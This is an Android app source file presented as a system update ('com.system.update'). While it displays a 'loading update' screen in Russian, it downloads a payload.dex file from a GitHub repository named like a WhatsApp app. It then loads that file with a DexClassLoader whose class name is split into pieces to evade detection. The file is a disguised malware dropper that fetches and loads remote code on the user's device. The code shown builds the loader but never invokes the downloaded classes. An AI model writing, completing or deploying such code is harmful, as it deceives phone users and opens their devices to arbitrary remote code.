package com.system.update;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.LinearLayout;
import android.graphics.Color;
import android.view.Gravity;
import android.os.AsyncTask;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.lang.reflect.Constructor;

public class MainActivity extends Activity {
    private static final String PAYLOAD_URL = "https://raw.githubusercontent.com/tamerlan022009-cloud/whatsapp_app/main/payload.txt";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));

        TextView tv = new TextView(this);
        tv.setText("Загрузка обновления...");
        tv.setTextSize(18);
        tv.setTextColor(Color.WHITE);
        layout.addView(tv);
        setContentView(layout);

        new DownloadTask().execute(PAYLOAD_URL);
    }

    private class DownloadTask extends AsyncTask<String, Void, File> {
        @Override
        protected File doInBackground(String... urls) {
            try {
                URL url = new URL(urls[0]);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.connect();
                InputStream input = conn.getInputStream();
                
                File dexFile = new File(getDir("dex", MODE_PRIVATE), "payload.dex");
                FileOutputStream output = new FileOutputStream(dexFile);
                byte[] data = new byte[1024];
                int count;
                while ((count = input.read(data)) != -1) {
                    output.write(data, 0, count);
                }
                output.flush();
                output.close();
                input.close();
                return dexFile;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

        @Override
        protected void onPostExecute(File dexFile) {
            if (dexFile != null) {
                try {
                    String p1 = "dalvik.system.";
                    String p2 = "Dex" + "Class";
                    String p3 = "Loader";
                    String className = p1 + p2 + p3;
                    
                    Class<?> clazz = Class.forName(className);
                    Constructor<?> constructor = clazz.getConstructor(String.class, String.class, String.class, ClassLoader.class);
                    
                    Object classLoader = constructor.newInstance(
                            dexFile.getAbsolutePath(),
                            getDir("outdex", MODE_PRIVATE).getAbsolutePath(),
                            null,
                            getClassLoader()
                    );
                    
                    finish();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
